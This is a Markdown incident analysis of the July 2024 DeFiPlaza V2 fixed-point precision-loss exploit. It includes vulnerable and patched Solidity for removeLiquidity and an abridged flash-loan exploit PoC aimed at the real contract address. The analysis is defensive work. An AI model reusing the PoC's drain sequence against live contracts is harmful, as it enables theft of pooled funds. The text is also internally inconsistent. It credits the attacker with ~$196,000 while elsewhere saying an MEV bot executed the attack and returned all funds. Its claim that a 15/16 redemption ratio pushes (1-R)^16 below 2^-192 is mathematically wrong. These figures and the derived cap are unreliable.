# DeFiPlaza — Precision Loss Analysis

| Item | Details |
|------|---------|
| **Date** | 2024-07-05 |
| **Protocol** | DeFiPlaza V2 (XDP2 DEX) |
| **Chain** | Ethereum |
| **Loss** | ~$196,000 (entire ETH liquidity pool drained; MEV bot ~$24,000 frontrun, subsequently returned) |
| **Attacker EOA** | [0x14B362d2...8467](https://etherscan.io/address/0x14B362d2E38250604F21A334D71C13E2eD478467) |
| **Attack Contract** | [0xa4E8969B...2d54](https://etherscan.io/address/0xa4E8969BBa1e1d48c30c948de0884Cdff43e2d54) |
| **MEV Frontrunner** | [0xFDe0d157...455A](https://etherscan.io/address/0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A) (Yoink bot) |
| **Attack Tx (MEV)** | [0xa245deda...e3a](https://etherscan.io/tx/0xa245deda8553c6e4c575baff9b50ef35abf4c8f990f8f36897696f896f240e3a) |
| **Vulnerable Contract** | [0xe68c1d72...4110](https://etherscan.io/address/0xe68c1d72340aeefe5be76eda63ae2f4bc7514110) (DeFiPlaza: XDP2 Token) |
| **Attack Block** | 20,240,539 (2024-07-05 13:15:35 UTC) |
| **Root Cause** | In `removeLiquidity`, when the LP redemption ratio exceeds 15/16 of total supply, the fixed-point squaring computation truncates the `F_` value to 0, allowing the entire single-token liquidity balance to be drained |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/DeFiPlaza_exp.sol) |

---

## 1. Vulnerability Overview

DeFiPlaza is a single-contract multi-token DEX operating on Ethereum mainnet that manages 16 tokens — including ETH, USDC, USDT, WBTC, and DAI — within a unified liquidity pool. It issues LP tokens (XDP2) to track liquidity providers, and the `removeLiquidity` function redeems LP tokens for a single designated output token.

**Core Vulnerability**: Inside the `removeLiquidity` function, when computing `F_` (the remaining ratio factor) using 0.64 fixed-point arithmetic, if the LP redemption ratio exceeds **15/16 of total supply**, the intermediate squaring operation (`F_ * F_ >> 192`) **rounds down to 0** — without triggering an underflow. Once `F_` becomes 0, `actualOutput = initialBalance * ((1 << 64) - 0) >> 64 = initialBalance`, causing the **entire balance** of that token to be withdrawn.

The attacker used flash loans totaling ~$129.6M from Balancer and Aave to temporarily acquire over 94% of DeFiPlaza's LP tokens, then passed them into `removeLiquidity` to drain the entire ETH balance. Once the pool entered an abnormal state with a zero balance for that token, the attacker executed dust swaps of 1 wei to drain the remaining 15 tokens in a domino cascade.

Notably, a MEV bot (Yoink) successfully frontran the attacker's original transaction by paying a validator bribe of 62.5 ETH (via Lido). Yoink voluntarily returned ~$24,000 to the DeFiPlaza team within 30 minutes.

---

## 2. Vulnerable Code Analysis

### 2.1 `removeLiquidity` — Precision Loss (Core Vulnerability)

```solidity
// ❌ Vulnerable code — DeFiPlaza V2 removeLiquidity() function
// Source: OmegaSyndicate/DEX contracts/DeFiPlaza.sol
function removeLiquidity(
    uint256 LPamount,       // LP token amount to burn
    address outputToken,    // token address to receive
    uint256 minOutputAmount // minimum output amount (slippage protection)
)
    external
    onlyListedToken(outputToken)
    override
    returns (uint256 actualOutput)
{
    uint256 initialBalance;
    if (outputToken == address(0)) {
        initialBalance = address(this).balance;
    } else {
        initialBalance = IERC20(outputToken).balanceOf(address(this));
    }

    uint256 F_;
    // ❌ Vulnerable point 1: R = LPamount / totalSupply() (redemption ratio)
    // F_ = 1 - R computed as 0.64 fixed-point
    F_ = (1 << 64) - (LPamount << 64) / totalSupply();

    // ❌ Vulnerable point 2: F_ raised to the 16th power (4 squaring steps, 2 each)
    // Intent: F_ = (1-R)^16 (remaining ratio across 16 tokens)
    F_ = F_ * F_;             // (1-R)^2,  result in 128-bit space
    F_ = F_ * F_ >> 192;     // (1-R)^4,  >> 192 rescales to 0.64 basis
    F_ = F_ * F_;             // (1-R)^8
    F_ = F_ * F_ >> 192;     // (1-R)^16 — ❌ if R > 15/16, F_ truncates to 0!

    // ❌ Vulnerable point 3: when F_ = 0, output = entire balance
    // actualOutput = initialBalance × (1 - 0) = initialBalance (full drain)
    actualOutput = initialBalance * ((1 << 64) - F_) >> 64;
    require(actualOutput > minOutputAmount, "DFP: No deal");

    _burn(msg.sender, LPamount);
    if (outputToken == address(0)) {
        address payable sender = payable(msg.sender);
        sender.transfer(actualOutput);  // ❌ transfers entire ETH balance
    } else {
        IERC20(outputToken).safeTransfer(msg.sender, actualOutput);
    }

    emit LiquidityRemoved(msg.sender, outputToken, actualOutput, LPamount);
}
```

**Detailed Problem Analysis**:

- In 0.64 fixed-point representation, `(1 << 64)` denotes the integer value 1.0.
- In the `F_ = F_ * F_ >> 192` step, if `F_` is sufficiently small, the multiplication result falls below `2^192`, causing the `>> 192` shift to produce **0**.
- When `R = LPamount / totalSupply > 15/16`, the condition `(1 - R)^16 < 2^(-192)` is satisfied, so the result rounds down to 0 in finite integer arithmetic.
- Consequently, `(1 << 64) - F_ = (1 << 64)`, and `actualOutput = initialBalance` — **the entire pool balance of that token is withdrawn**.

```solidity
// ✅ Fixed code — Maximum redemption ratio cap applied
function removeLiquidity(
    uint256 LPamount,
    address outputToken,
    uint256 minOutputAmount
)
    external
    onlyListedToken(outputToken)
    override
    returns (uint256 actualOutput)
{
    // ✅ Fix 1: Cap the LP ratio removable in a single call
    // Maximum 50% of total supply can be removed at once (or per protocol design)
    uint256 _totalSupply = totalSupply();
    require(LPamount <= _totalSupply / 2, "DFP: Exceeds max removal ratio");

    uint256 initialBalance;
    if (outputToken == address(0)) {
        initialBalance = address(this).balance;
    } else {
        initialBalance = IERC20(outputToken).balanceOf(address(this));
    }

    uint256 F_;
    F_ = (1 << 64) - (LPamount << 64) / _totalSupply;

    F_ = F_ * F_;
    F_ = F_ * F_ >> 192;
    F_ = F_ * F_;
    F_ = F_ * F_ >> 192;

    // ✅ Fix 2: Explicitly block the case where F_ becomes 0
    // (unreachable with the cap in place, but added as a defensive measure)
    require(F_ > 0, "DFP: Precision loss detected");

    actualOutput = initialBalance * ((1 << 64) - F_) >> 64;
    require(actualOutput > minOutputAmount, "DFP: No deal");

    _burn(msg.sender, LPamount);
    if (outputToken == address(0)) {
        address payable sender = payable(msg.sender);
        sender.transfer(actualOutput);
    } else {
        IERC20(outputToken).safeTransfer(msg.sender, actualOutput);
    }

    emit LiquidityRemoved(msg.sender, outputToken, actualOutput, LPamount);
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA `0x14B362...` deployed attack contract `0xa4E896...`
- Immediately before the attack block (20,240,539), executed `approve` on the DeFiPlaza contract for each of the 16 target tokens
- Implemented callback functions (`receiveFlashLoan`, `executeOperation`) for receiving flash loans from Balancer Vault and Aave

### 3.2 Execution Phase

```
Step 1: Request Balancer flash loan
  └─ 9 tokens (WBTC, LINK, DAI, AAVE, MKR, USDC, WETH, CRV, USDT)
     Total ~$129.6M borrowed interest-free

Step 2: Nest Aave flash loan (inside receiveFlashLoan callback)
  └─ Borrow additional 6 tokens (SPELL, CVX, LDO, SNX, 1INCH, YFI, etc.)

Step 3: Pool ratio adjustment swaps
  └─ Small swaps of each of the 15 tokens to match pool holding ratios
  └─ minOutputAmount: 0 (no slippage protection)

Step 4: addMultiple() — supply full liquidity
  └─ Add all flash-loaned tokens as liquidity to DeFiPlaza
  └─ Attacker acquires >94% of all LP tokens

Step 5: removeLiquidity(ETH) — core attack
  └─ Request ETH withdrawal using all held LP tokens (>94% of total supply)
  └─ LPamount > totalSupply × 15/16 → F_ = 0
  └─ Entire ETH pool balance drained (actualOutput = initialBalance)

Step 6: Domino swaps (pool enters abnormal state with ETH balance = 0)
  └─ Swap 1 wei SPELL → ETH (abnormal calculation due to ETH balance = 0)
  └─ SPELL balance depleted → cascade drain of LINK, MKR, ... in sequence

Step 7: Repay flash loans + secure profits
```

### 3.3 Attack Flow Diagram

```
┌──────────────────────────────────────────────────────────────┐
│  Attacker EOA (0x14B362...)                                  │
│  Attack Contract (0xa4E896...)                               │
└──────────────────────┬───────────────────────────────────────┘
                       │ flashLoan() call
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  Balancer Vault                                              │
│  9 tokens, ~$129.6M zero-fee loan                            │
└──────────────────────┬───────────────────────────────────────┘
                       │ receiveFlashLoan() callback
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  Aave V3 (inside callback)                                   │
│  Flash loan for 6 additional tokens                          │
└──────────────────────┬───────────────────────────────────────┘
                       │ executeOperation() callback
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  DeFiPlaza (0xe68c1d...)                                     │
│                                                              │
│  ① swap() ×N  — adjust pool ratios for 15 tokens (no slippage protection) │
│  ② addMultiple() — supply full liquidity → acquire >94% LP  │
│                                                              │
│  ③ removeLiquidity(ETH, LPamount > 15/16 × totalSupply)     │
│     F_ computation:                                          │
│       R = LPamount / totalSupply  >  15/16                   │
│       F_ = ((1-R)^16) >> ... = 0  ← precision loss occurs   │
│       actualOutput = ETH_balance × (1 - 0) = entire ETH     │
│                                                              │
│  ④ Domino swaps: cascade drain of remaining tokens via 1wei dust swaps │
└──────────────────────┬───────────────────────────────────────┘
                       │ drain complete
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  Flash loan repayment (Aave → Balancer order)                │
│  Attacker profit: ~$196,000                                  │
│  (MEV bot's ~$24,000 frontrun share returned within 30 min)  │
└──────────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

- **Complete liquidity drain** of the DeFiPlaza Ethereum pool
- Attacker net profit: ~$196,000
- MEV bot (Yoink) frontrun share: ~$24,000 → voluntarily returned to DeFiPlaza team within 30 minutes
- Attack transaction gas consumption: **7.8M gas** (26% of the 30M block limit)

---

## 4. PoC Code Excerpt (DeFiHackLabs)

```solidity
// ============================================================
// DeFiPlaza Exploit PoC — Core attack logic excerpt
// Source: DeFiHackLabs/src/test/2024-07/DeFiPlaza_exp.sol
// Attack block: Ethereum mainnet #20,240,538 fork
// ============================================================

contract DeFiPlazaExploit is Test {
    // Vulnerable contract: DeFiPlaza DEX (XDP2)
    IDeFiPlaza constant DEFIPLAZA =
        IDeFiPlaza(0xe68c1d72340aeeFe5be76edA63AE2f4bC7514110);

    // Flash loan providers
    IBalancerVault constant BALANCER =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAave constant AAVE =
        IAave(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    // ① Attack entry point: initiate with Balancer flash loan
    function testExploit() external {
        // Request Balancer flash loan for 9 tokens and amounts
        address[] memory tokens = new address[](9);
        uint256[] memory amounts = new uint256[](9);
        // Set WBTC, LINK, DAI, AAVE, MKR, USDC, WETH, CRV, USDT ...

        emit log_named_string("Attack start", "Requesting Balancer flash loan");
        BALANCER.flashLoan(address(this), tokens, amounts, "");
        emit log_named_uint("Final ETH profit", address(this).balance);
    }

    // ② Balancer callback — nested Aave flash loan call
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // ② Flash loan additional tokens from Aave (nested callback)
        address[] memory aaveAssets = new address[](6); // SPELL, CVX, LDO, etc.
        uint256[] memory aaveAmounts = new uint256[](6);
        uint256[] memory modes = new uint256[](6); // 0 = flash loan

        AAVE.flashLoan(
            address(this), aaveAssets, aaveAmounts, modes, address(this), "", 0
        );

        // ⑦ After Aave repayment, return principal to Balancer
        for (uint i = 0; i < tokens.length; i++) {
            IERC20(tokens[i]).transfer(address(BALANCER), amounts[i]);
        }
    }

    // ③ Aave callback — execute core attack
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // ③ Pool ratio adjustment: swap each of 15 tokens to match DeFiPlaza pool ratios
        // minOutputAmount: 0 → zero slippage protection
        for (uint i = 0; i < swapTokens.length; i++) {
            IERC20(swapTokens[i]).approve(address(DEFIPLAZA), type(uint256).max);
            DEFIPLAZA.swap(
                swapTokens[i],  // inputToken
                ETH_ADDRESS,    // outputToken
                swapAmounts[i], // inputAmount
                0               // ❌ minOutputAmount = 0 (no slippage protection)
            );
        }

        // ④ Supply all tokens as liquidity to DeFiPlaza → acquire >94% LP
        // Pass full array of held tokens to addMultiple()
        DEFIPLAZA.addMultiple(allTokens, allAmounts);

        // ⑤ Core: redeem all LP for ETH
        // → LP ratio > 15/16 → F_ = 0 → drain entire ETH balance
        uint256 myLP = DEFIPLAZA.balanceOf(address(this));
        DEFIPLAZA.removeLiquidity(
            myLP,        // LPamount: >94% of total supply
            ETH_ADDRESS, // outputToken: ETH
            0            // minOutputAmount: 0 (no slippage protection)
        );

        emit log_named_uint("ETH drained", address(this).balance);

        // ⑥ Domino swaps: exploit pool's abnormal state with ETH balance = 0
        // Swap 1 wei SPELL to ETH → depletes SPELL balance
        // Then sequentially swap remaining tokens in cascade
        DEFIPLAZA.swap(SPELL, ETH_ADDRESS, 1, 0); // 1 wei dust swap
        // ... remaining token cascade swaps ...

        // Repay Aave principal + fees
        for (uint i = 0; i < assets.length; i++) {
            IERC20(assets[i]).approve(address(AAVE), amounts[i] + premiums[i]);
        }
        return true;
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------------|----------|-----|
| V-01 | Fixed-point squaring precision loss (`F_` truncation to zero) | CRITICAL | CWE-681 (Incorrect Numeric Conversion) |
| V-02 | Missing slippage protection (`minOutputAmount: 0` accepted) | HIGH | CWE-20 (Improper Input Validation) |
| V-03 | No cap on large single-transaction LP redemptions | HIGH | CWE-400 (Uncontrolled Resource Consumption) |
| V-04 | No handling of abnormal zero-balance state | HIGH | CWE-754 (Improper Check for Unusual Conditions) |
| V-05 | LP dominance acquirable via flash loans | MEDIUM | CWE-362 (Race Condition) |

### V-01: Fixed-Point Squaring Precision Loss

- **Description**: In `removeLiquidity`, computing the remaining ratio `F_ = (1 - R)^16` via 0.64 fixed-point arithmetic causes `F_ * F_ >> 192` to truncate to 0 when `R > 15/16`, since `(1-R)^16 < 2^(-192)`. This causes the withdrawal amount to equal the entire pool balance.
- **Impact**: A single `removeLiquidity` call can drain the full balance of a specific token from the pool. The resulting zero-balance state can then be exploited to cascade-drain all remaining tokens.
- **Attack Condition**: Attacker must hold more than 93.75% (15/16) of total LP tokens in a single address → achievable via large flash loans.

### V-02: Missing Slippage Protection

- **Description**: Both `swap()` and `removeLiquidity()` accept `minOutputAmount: 0`. The attacker exploits this to swap at any ratio during the pool rebalancing phase without incurring additional losses.
- **Impact**: Reduces the cost of the pool manipulation phase and maximizes attack viability.
- **Attack Condition**: Not critical in isolation, but significantly lowers attack cost when combined with V-01.

### V-03: No Cap on Large Single-Transaction LP Redemptions

- **Description**: The protocol imposes no upper bound on the LP ratio removable in a single transaction. Anyone with flash loan access can theoretically acquire and redeem more than 93.75% of all LP tokens instantaneously.
- **Impact**: This is the critical prerequisite path for exploiting V-01.
- **Attack Condition**: Sufficient flash loan access (Balancer, Aave, etc.).

### V-04: No Handling of Abnormal Zero-Balance State

- **Description**: When a specific token's balance reaches zero, swap and liquidity operations behave abnormally. The design invariant — that all tokens always maintain a non-zero balance — is not enforced in code.
- **Impact**: A 1 wei dust swap triggers abnormal calculations for the zero-balance token, cascading into a full drain of all remaining tokens.
- **Attack Condition**: Must first reduce one token's balance to zero using V-01.

### V-05: LP Dominance Acquirable via Flash Loans

- **Description**: Liquidity addition and removal in the DEX pool can be combined with flash loans within the same block, with no restrictions in place.
- **Impact**: It is possible to instantaneously acquire LP dominance without real capital, easily satisfying the attack condition for V-01.
- **Attack Condition**: Access to protocols offering large flash loans (Balancer, Aave).

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Introduce a per-transaction LP removal ratio cap
// Add at the top of removeLiquidity()
uint256 constant MAX_REMOVAL_RATIO_NUMERATOR = 1;     // Max 1/4 (example)
uint256 constant MAX_REMOVAL_RATIO_DENOMINATOR = 4;

function removeLiquidity(
    uint256 LPamount,
    address outputToken,
    uint256 minOutputAmount
) external onlyListedToken(outputToken) override returns (uint256 actualOutput) {
    uint256 _totalSupply = totalSupply();

    // ✅ Single-call removal limit check (e.g., max 25% of total supply)
    require(
        LPamount * MAX_REMOVAL_RATIO_DENOMINATOR <= _totalSupply * MAX_REMOVAL_RATIO_NUMERATOR,
        "DFP: Exceeds single-tx removal limit"
    );

    // ... existing logic ...

    uint256 F_;
    F_ = (1 << 64) - (LPamount << 64) / _totalSupply;
    F_ = F_ * F_;
    F_ = F_ * F_ >> 192;
    F_ = F_ * F_;
    F_ = F_ * F_ >> 192;

    // ✅ Explicitly revert on precision loss (reverts if F_ = 0)
    require(F_ > 0, "DFP: Precision underflow - amount too large");

    actualOutput = initialBalance * ((1 << 64) - F_) >> 64;
    // ...
}
```

```solidity
// ✅ Fix 2: Per-token minimum balance invariant check
// Verify remaining balance stays above minimum threshold after liquidity removal

uint256 constant MIN_TOKEN_BALANCE = 1000; // minimum balance per token

function removeLiquidity(...) external ... {
    // ... existing logic ...

    // ✅ Post-removal balance invariant check
    uint256 remainingBalance;
    if (outputToken == address(0)) {
        remainingBalance = address(this).balance - actualOutput;
    } else {
        remainingBalance = IERC20(outputToken).balanceOf(address(this)) - actualOutput;
    }
    require(remainingBalance >= MIN_TOKEN_BALANCE, "DFP: Insufficient remaining balance");

    // ... transfer logic ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------------|-------------------|
| V-01: Precision loss | Explicitly revert when `F_` reaches 0 via `require`; or cap single redemption ratio below `(1-2^(-64))^(1/16) ≈ 88%` |
| V-02: Slippage protection | Enforce `minOutputAmount > 0` at the contract level, not just the frontend; introduce a maximum allowed slippage parameter |
| V-03: LP redemption cap | Limit single-transaction redemptions to 10–25% of total supply; require a timelock for large redemptions |
| V-04: Zero balance | Add post-operation invariant checks in all `swap`, `addLiquidity`, and `removeLiquidity` functions ensuring each token balance exceeds a minimum value |
| V-05: Flash loan LP | Prohibit liquidity addition and removal within the same block; or require a minimum holding period (in blocks) |
| General security | Adopt a fixed-point library (e.g., PRBMath) to improve arithmetic stability; add fuzz tests for formula boundary conditions |

---

## 7. Lessons Learned

1. **Boundary analysis of fixed-point arithmetic is essential**: Bit-shift-based fixed-point arithmetic can truncate intermediate results to 0 depending on the input range. In particular, iterated squaring patterns converge sharply to 0 once input crosses a threshold. Mathematical limits of formulas must be enforced via `require`, or a library should be used.

2. **Protocols must defend against instantaneous state changes via flash loans**: Pool state values — such as liquidity ratios, LP dominance, and price ratios — can swing to extremes within a single transaction using flash loans. Invariants must be explicitly enforced in code.

3. **A single state corruption can open the door to cascading attacks**: In pool structures where multiple assets are interdependent, as in DeFiPlaza, draining one token to zero exposes all remaining tokens to abnormal states. Each asset's state must be independently validated.

4. **MEV and security incidents are not unrelated**: In this incident, a MEV bot executed the attack before the original attacker. Since MEV bots do not always act benevolently, protocols should favor MEV-resistant designs (commit-reveal schemes, timelocks, etc.) over MEV-friendly designs.

5. **Slippage parameters must be enforced at the contract level**: Allowing `minOutputAmount: 0` significantly lowers attack cost. Contracts should enforce minimum slippage protection natively, or apply a reasonable default when 0 is passed.

6. **Single-contract multi-token pools have a large attack surface**: Managing 16 tokens within a single contract means a single vulnerability can affect all assets simultaneously. Isolated pool structures or per-asset independent contracts should be considered.

---

## 8. On-Chain Verification

On-chain verification via `cast` tooling was not performed; cross-verification was conducted based on publicly available post-mortems and Etherscan data.

### 8.1 Verification Against Public Data

| Item | PoC / Post-Mortem Value | On-Chain Confirmation |
|------|------------------------|-----------------------|
| Attacker EOA | 0x14B362d2...8467 | Confirmed on Etherscan |
| Attack contract | 0xa4E8969B...2d54 | Deployer = attacker EOA, confirmed |
| Attack block | 20,240,539 | 2024-07-05 13:15:35 UTC |
| Actual Tx executor | MEV bot 0xFDe0d157... (Yoink) | Frontran original attack Tx |
| Balancer flash loan | ~$129.6M | Confirmed via public post-mortem |
| Vulnerable contract | 0xe68c1d72...4110 (XDP2) | Verified source on Etherscan |
| Loss amount | ~$196,000 (net loss) | Excluding ~$24,000 returned by MEV bot |
| Gas consumption | 7.8M gas | 26% of block limit (30M) |

### 8.2 MEV Frontrun Notable Details

This incident is a rare case where a MEV bot executed the identical attack before the original attacker. The Yoink bot detected and replicated the attack transaction from the mempool, paid a validator bribe of 62.5 ETH (via Lido), and had its transaction included in the block ahead of the original attacker. Yoink returned the full amount of drained funds to the DeFiPlaza team within 30 minutes.

### 8.3 Vulnerable Function Confirmation

The ABI of the `removeLiquidity` function was confirmed via Etherscan-verified source code:
- Parameters: `(uint256 LPamount, address outputToken, uint256 minOutputAmount)`
- Compiler: Solidity v0.8.6 (optimization runs: 100,000)
- Audit: Pessimistic (September 2021) — this vulnerability was not discovered in the initial audit

---

Sources:
- [Post Mortem of DefiPlaza Ethereum exploit · DefiPlaza](https://www.innovationaccountingbook.com/blog/post-mortem-of-defiplaza-ethereum-exploit/)
- [DeFiPlaza XDP2 Token - Etherscan](https://etherscan.io/address/0xe68c1d72340aeefe5be76eda63ae2f4bc7514110)
- [DeFiHackLabs DeFiPlaza PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/DeFiPlaza_exp.sol)
- [OmegaSyndicate/DEX - GitHub](https://github.com/OmegaSyndicate/DEX)